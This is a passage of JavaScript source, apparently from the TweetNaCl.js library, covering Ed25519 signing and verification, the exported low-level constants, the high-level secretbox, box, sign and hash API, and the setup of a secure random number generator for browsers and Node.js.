  if (!seeded) randombytes(sk, 32);
  crypto_hash(d, sk, 32);
  d[0] &= 248;
  d[31] &= 127;
  d[31] |= 64;

  scalarbase(p, d);
  pack(pk, p);

  for (i = 0; i < 32; i++) sk[i+32] = pk[i];
  return 0;
}

var L = new Float64Array([0xed, 0xd3, 0xf5, 0x5c, 0x1a, 0x63, 0x12, 0x58, 0xd6, 0x9c, 0xf7, 0xa2, 0xde, 0xf9, 0xde, 0x14, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0x10]);

function modL(r, x) {
  var carry, i, j, k;
  for (i = 63; i >= 32; --i) {
    carry = 0;
    for (j = i - 32, k = i - 12; j < k; ++j) {
      x[j] += carry - 16 * x[i] * L[j - (i - 32)];
      carry = (x[j] + 128) >> 8;
      x[j] -= carry * 256;
    }
    x[j] += carry;
    x[i] = 0;
  }
  carry = 0;
  for (j = 0; j < 32; j++) {
    x[j] += carry - (x[31] >> 4) * L[j];
    carry = x[j] >> 8;
    x[j] &= 255;
  }
  for (j = 0; j < 32; j++) x[j] -= carry * L[j];
  for (i = 0; i < 32; i++) {
    x[i+1] += x[i] >> 8;
    r[i] = x[i] & 255;
  }
}

function reduce(r) {
  var x = new Float64Array(64), i;
  for (i = 0; i < 64; i++) x[i] = r[i];
  for (i = 0; i < 64; i++) r[i] = 0;
  modL(r, x);
}

// Note: difference from C - smlen returned, not passed as argument.
function crypto_sign(sm, m, n, sk) {
  var d = new Uint8Array(64), h = new Uint8Array(64), r = new Uint8Array(64);
  var i, j, x = new Float64Array(64);
  var p = [gf(), gf(), gf(), gf()];

  crypto_hash(d, sk, 32);
  d[0] &= 248;
  d[31] &= 127;
  d[31] |= 64;

  var smlen = n + 64;
  for (i = 0; i < n; i++) sm[64 + i] = m[i];
  for (i = 0; i < 32; i++) sm[32 + i] = d[32 + i];

  crypto_hash(r, sm.subarray(32), n+32);
  reduce(r);
  scalarbase(p, r);
  pack(sm, p);

  for (i = 32; i < 64; i++) sm[i] = sk[i];
  crypto_hash(h, sm, n + 64);
  reduce(h);

  for (i = 0; i < 64; i++) x[i] = 0;
  for (i = 0; i < 32; i++) x[i] = r[i];
  for (i = 0; i < 32; i++) {
    for (j = 0; j < 32; j++) {
      x[i+j] += h[i] * d[j];
    }
  }

  modL(sm.subarray(32), x);
  return smlen;
}

function unpackneg(r, p) {
  var t = gf(), chk = gf(), num = gf(),
      den = gf(), den2 = gf(), den4 = gf(),
      den6 = gf();

  set25519(r[2], gf1);
  unpack25519(r[1], p);
  S(num, r[1]);
  M(den, num, D);
  Z(num, num, r[2]);
  A(den, r[2], den);

  S(den2, den);
  S(den4, den2);
  M(den6, den4, den2);
  M(t, den6, num);
  M(t, t, den);

  pow2523(t, t);
  M(t, t, num);
  M(t, t, den);
  M(t, t, den);
  M(r[0], t, den);

  S(chk, r[0]);
  M(chk, chk, den);
  if (neq25519(chk, num)) M(r[0], r[0], I);

  S(chk, r[0]);
  M(chk, chk, den);
  if (neq25519(chk, num)) return -1;

  if (par25519(r[0]) === (p[31]>>7)) Z(r[0], gf0, r[0]);

  M(r[3], r[0], r[1]);
  return 0;
}

function crypto_sign_open(m, sm, n, pk) {
  var i, mlen;
  var t = new Uint8Array(32), h = new Uint8Array(64);
  var p = [gf(), gf(), gf(), gf()],
      q = [gf(), gf(), gf(), gf()];

  mlen = -1;
  if (n < 64) return -1;

  if (unpackneg(q, pk)) return -1;

  for (i = 0; i < n; i++) m[i] = sm[i];
  for (i = 0; i < 32; i++) m[i+32] = pk[i];
  crypto_hash(h, m, n);
  reduce(h);
  scalarmult(p, q, h);

  scalarbase(q, sm.subarray(32));
  add(p, q);
  pack(t, p);

  n -= 64;
  if (crypto_verify_32(sm, 0, t, 0)) {
    for (i = 0; i < n; i++) m[i] = 0;
    return -1;
  }

  for (i = 0; i < n; i++) m[i] = sm[i + 64];
  mlen = n;
  return mlen;
}

var crypto_secretbox_KEYBYTES = 32,
    crypto_secretbox_NONCEBYTES = 24,
    crypto_secretbox_ZEROBYTES = 32,
    crypto_secretbox_BOXZEROBYTES = 16,
    crypto_scalarmult_BYTES = 32,
    crypto_scalarmult_SCALARBYTES = 32,
    crypto_box_PUBLICKEYBYTES = 32,
    crypto_box_SECRETKEYBYTES = 32,
    crypto_box_BEFORENMBYTES = 32,
    crypto_box_NONCEBYTES = crypto_secretbox_NONCEBYTES,
    crypto_box_ZEROBYTES = crypto_secretbox_ZEROBYTES,
    crypto_box_BOXZEROBYTES = crypto_secretbox_BOXZEROBYTES,
    crypto_sign_BYTES = 64,
    crypto_sign_PUBLICKEYBYTES = 32,
    crypto_sign_SECRETKEYBYTES = 64,
    crypto_sign_SEEDBYTES = 32,
    crypto_hash_BYTES = 64;

nacl.lowlevel = {
  crypto_core_hsalsa20: crypto_core_hsalsa20,
  crypto_stream_xor: crypto_stream_xor,
  crypto_stream: crypto_stream,
  crypto_stream_salsa20_xor: crypto_stream_salsa20_xor,
  crypto_stream_salsa20: crypto_stream_salsa20,
  crypto_onetimeauth: crypto_onetimeauth,
  crypto_onetimeauth_verify: crypto_onetimeauth_verify,
  crypto_verify_16: crypto_verify_16,
  crypto_verify_32: crypto_verify_32,
  crypto_secretbox: crypto_secretbox,
  crypto_secretbox_open: crypto_secretbox_open,
  crypto_scalarmult: crypto_scalarmult,
  crypto_scalarmult_base: crypto_scalarmult_base,
  crypto_box_beforenm: crypto_box_beforenm,
  crypto_box_afternm: crypto_box_afternm,
  crypto_box: crypto_box,
  crypto_box_open: crypto_box_open,
  crypto_box_keypair: crypto_box_keypair,
  crypto_hash: crypto_hash,
  crypto_sign: crypto_sign,
  crypto_sign_keypair: crypto_sign_keypair,
  crypto_sign_open: crypto_sign_open,

  crypto_secretbox_KEYBYTES: crypto_secretbox_KEYBYTES,
  crypto_secretbox_NONCEBYTES: crypto_secretbox_NONCEBYTES,
  crypto_secretbox_ZEROBYTES: crypto_secretbox_ZEROBYTES,
  crypto_secretbox_BOXZEROBYTES: crypto_secretbox_BOXZEROBYTES,
  crypto_scalarmult_BYTES: crypto_scalarmult_BYTES,
  crypto_scalarmult_SCALARBYTES: crypto_scalarmult_SCALARBYTES,
  crypto_box_PUBLICKEYBYTES: crypto_box_PUBLICKEYBYTES,
  crypto_box_SECRETKEYBYTES: crypto_box_SECRETKEYBYTES,
  crypto_box_BEFORENMBYTES: crypto_box_BEFORENMBYTES,
  crypto_box_NONCEBYTES: crypto_box_NONCEBYTES,
  crypto_box_ZEROBYTES: crypto_box_ZEROBYTES,
  crypto_box_BOXZEROBYTES: crypto_box_BOXZEROBYTES,
  crypto_sign_BYTES: crypto_sign_BYTES,
  crypto_sign_PUBLICKEYBYTES: crypto_sign_PUBLICKEYBYTES,
  crypto_sign_SECRETKEYBYTES: crypto_sign_SECRETKEYBYTES,
  crypto_sign_SEEDBYTES: crypto_sign_SEEDBYTES,
  crypto_hash_BYTES: crypto_hash_BYTES
};

/* High-level API */

function checkLengths(k, n) {
  if (k.length !== crypto_secretbox_KEYBYTES) throw new Error('bad key size');
  if (n.length !== crypto_secretbox_NONCEBYTES) throw new Error('bad nonce size');
}

function checkBoxLengths(pk, sk) {
  if (pk.length !== crypto_box_PUBLICKEYBYTES) throw new Error('bad public key size');
  if (sk.length !== crypto_box_SECRETKEYBYTES) throw new Error('bad secret key size');
}

function checkArrayTypes() {
  for (var i = 0; i < arguments.length; i++) {
    if (!(arguments[i] instanceof Uint8Array))
      throw new TypeError('unexpected type, use Uint8Array');
  }
}

function cleanup(arr) {
  for (var i = 0; i < arr.length; i++) arr[i] = 0;
}

nacl.randomBytes = function(n) {
  var b = new Uint8Array(n);
  randombytes(b, n);
  return b;
};

nacl.secretbox = function(msg, nonce, key) {
  checkArrayTypes(msg, nonce, key);
  checkLengths(key, nonce);
  var m = new Uint8Array(crypto_secretbox_ZEROBYTES + msg.length);
  var c = new Uint8Array(m.length);
  for (var i = 0; i < msg.length; i++) m[i+crypto_secretbox_ZEROBYTES] = msg[i];
  crypto_secretbox(c, m, m.length, nonce, key);
  return c.subarray(crypto_secretbox_BOXZEROBYTES);
};

nacl.secretbox.open = function(box, nonce, key) {
  checkArrayTypes(box, nonce, key);
  checkLengths(key, nonce);
  var c = new Uint8Array(crypto_secretbox_BOXZEROBYTES + box.length);
  var m = new Uint8Array(c.length);
  for (var i = 0; i < box.length; i++) c[i+crypto_secretbox_BOXZEROBYTES] = box[i];
  if (c.length < 32) return null;
  if (crypto_secretbox_open(m, c, c.length, nonce, key) !== 0) return null;
  return m.subarray(crypto_secretbox_ZEROBYTES);
};

nacl.secretbox.keyLength = crypto_secretbox_KEYBYTES;
nacl.secretbox.nonceLength = crypto_secretbox_NONCEBYTES;
nacl.secretbox.overheadLength = crypto_secretbox_BOXZEROBYTES;

nacl.scalarMult = function(n, p) {
  checkArrayTypes(n, p);
  if (n.length !== crypto_scalarmult_SCALARBYTES) throw new Error('bad n size');
  if (p.length !== crypto_scalarmult_BYTES) throw new Error('bad p size');
  var q = new Uint8Array(crypto_scalarmult_BYTES);
  crypto_scalarmult(q, n, p);
  return q;
};

nacl.scalarMult.base = function(n) {
  checkArrayTypes(n);
  if (n.length !== crypto_scalarmult_SCALARBYTES) throw new Error('bad n size');
  var q = new Uint8Array(crypto_scalarmult_BYTES);
  crypto_scalarmult_base(q, n);
  return q;
};

nacl.scalarMult.scalarLength = crypto_scalarmult_SCALARBYTES;
nacl.scalarMult.groupElementLength = crypto_scalarmult_BYTES;

nacl.box = function(msg, nonce, publicKey, secretKey) {
  var k = nacl.box.before(publicKey, secretKey);
  return nacl.secretbox(msg, nonce, k);
};

nacl.box.before = function(publicKey, secretKey) {
  checkArrayTypes(publicKey, secretKey);
  checkBoxLengths(publicKey, secretKey);
  var k = new Uint8Array(crypto_box_BEFORENMBYTES);
  crypto_box_beforenm(k, publicKey, secretKey);
  return k;
};

nacl.box.after = nacl.secretbox;

nacl.box.open = function(msg, nonce, publicKey, secretKey) {
  var k = nacl.box.before(publicKey, secretKey);
  return nacl.secretbox.open(msg, nonce, k);
};

nacl.box.open.after = nacl.secretbox.open;

nacl.box.keyPair = function() {
  var pk = new Uint8Array(crypto_box_PUBLICKEYBYTES);
  var sk = new Uint8Array(crypto_box_SECRETKEYBYTES);
  crypto_box_keypair(pk, sk);
  return {publicKey: pk, secretKey: sk};
};

nacl.box.keyPair.fromSecretKey = function(secretKey) {
  checkArrayTypes(secretKey);
  if (secretKey.length !== crypto_box_SECRETKEYBYTES)
    throw new Error('bad secret key size');
  var pk = new Uint8Array(crypto_box_PUBLICKEYBYTES);
  crypto_scalarmult_base(pk, secretKey);
  return {publicKey: pk, secretKey: new Uint8Array(secretKey)};
};

nacl.box.publicKeyLength = crypto_box_PUBLICKEYBYTES;
nacl.box.secretKeyLength = crypto_box_SECRETKEYBYTES;
nacl.box.sharedKeyLength = crypto_box_BEFORENMBYTES;
nacl.box.nonceLength = crypto_box_NONCEBYTES;
nacl.box.overheadLength = nacl.secretbox.overheadLength;

nacl.sign = function(msg, secretKey) {
  checkArrayTypes(msg, secretKey);
  if (secretKey.length !== crypto_sign_SECRETKEYBYTES)
    throw new Error('bad secret key size');
  var signedMsg = new Uint8Array(crypto_sign_BYTES+msg.length);
  crypto_sign(signedMsg, msg, msg.length, secretKey);
  return signedMsg;
};

nacl.sign.open = function(signedMsg, publicKey) {
  checkArrayTypes(signedMsg, publicKey);
  if (publicKey.length !== crypto_sign_PUBLICKEYBYTES)
    throw new Error('bad public key size');
  var tmp = new Uint8Array(signedMsg.length);
  var mlen = crypto_sign_open(tmp, signedMsg, signedMsg.length, publicKey);
  if (mlen < 0) return null;
  var m = new Uint8Array(mlen);
  for (var i = 0; i < m.length; i++) m[i] = tmp[i];
  return m;
};

nacl.sign.detached = function(msg, secretKey) {
  var signedMsg = nacl.sign(msg, secretKey);
  var sig = new Uint8Array(crypto_sign_BYTES);
  for (var i = 0; i < sig.length; i++) sig[i] = signedMsg[i];
  return sig;
};

nacl.sign.detached.verify = function(msg, sig, publicKey) {
  checkArrayTypes(msg, sig, publicKey);
  if (sig.length !== crypto_sign_BYTES)
    throw new Error('bad signature size');
  if (publicKey.length !== crypto_sign_PUBLICKEYBYTES)
    throw new Error('bad public key size');
  var sm = new Uint8Array(crypto_sign_BYTES + msg.length);
  var m = new Uint8Array(crypto_sign_BYTES + msg.length);
  var i;
  for (i = 0; i < crypto_sign_BYTES; i++) sm[i] = sig[i];
  for (i = 0; i < msg.length; i++) sm[i+crypto_sign_BYTES] = msg[i];
  return (crypto_sign_open(m, sm, sm.length, publicKey) >= 0);
};

nacl.sign.keyPair = function() {
  var pk = new Uint8Array(crypto_sign_PUBLICKEYBYTES);
  var sk = new Uint8Array(crypto_sign_SECRETKEYBYTES);
  crypto_sign_keypair(pk, sk);
  return {publicKey: pk, secretKey: sk};
};

nacl.sign.keyPair.fromSecretKey = function(secretKey) {
  checkArrayTypes(secretKey);
  if (secretKey.length !== crypto_sign_SECRETKEYBYTES)
    throw new Error('bad secret key size');
  var pk = new Uint8Array(crypto_sign_PUBLICKEYBYTES);
  for (var i = 0; i < pk.length; i++) pk[i] = secretKey[32+i];
  return {publicKey: pk, secretKey: new Uint8Array(secretKey)};
};

nacl.sign.keyPair.fromSeed = function(seed) {
  checkArrayTypes(seed);
  if (seed.length !== crypto_sign_SEEDBYTES)
    throw new Error('bad seed size');
  var pk = new Uint8Array(crypto_sign_PUBLICKEYBYTES);
  var sk = new Uint8Array(crypto_sign_SECRETKEYBYTES);
  for (var i = 0; i < 32; i++) sk[i] = seed[i];
  crypto_sign_keypair(pk, sk, true);
  return {publicKey: pk, secretKey: sk};
};

nacl.sign.publicKeyLength = crypto_sign_PUBLICKEYBYTES;
nacl.sign.secretKeyLength = crypto_sign_SECRETKEYBYTES;
nacl.sign.seedLength = crypto_sign_SEEDBYTES;
nacl.sign.signatureLength = crypto_sign_BYTES;

nacl.hash = function(msg) {
  checkArrayTypes(msg);
  var h = new Uint8Array(crypto_hash_BYTES);
  crypto_hash(h, msg, msg.length);
  return h;
};

nacl.hash.hashLength = crypto_hash_BYTES;

nacl.verify = function(x, y) {
  checkArrayTypes(x, y);
  // Zero length arguments are considered not equal.
  if (x.length === 0 || y.length === 0) return false;
  if (x.length !== y.length) return false;
  return (vn(x, 0, y, 0, x.length) === 0) ? true : false;
};

nacl.setPRNG = function(fn) {
  randombytes = fn;
};

(function() {
  // Initialize PRNG if environment provides CSPRNG.
  // If not, methods calling randombytes will throw.
  var crypto = typeof self !== 'undefined' ? (self.crypto || self.msCrypto) : null;
  if (crypto && crypto.getRandomValues) {
    // Browsers.
    var QUOTA = 65536;
    nacl.setPRNG(function(x, n) {
      var i, v = new Uint8Array(n);
      for (i = 0; i < n; i += QUOTA) {
        crypto.getRandomValues(v.subarray(i, i + Math.min(n - i, QUOTA)));
      }
      for (i = 0; i < n; i++) x[i] = v[i];
      cleanup(v);
    });
  } else if (typeof require !== 'undefined') {
    // Node.js.
    crypto = require('crypto');
    if (crypto && crypto.randomBytes) {
      nacl.setPRNG(function(x, n) {
        var i, v = crypto.randomBytes(n);
        for (i = 0; i < n; i++) x[i] = v[i];
        cleanup(v);
      });
    }
  }
})();

})(typeof module !== 'undefined' && module.exports ? module.exports : (self.nacl = self.nacl || {}));
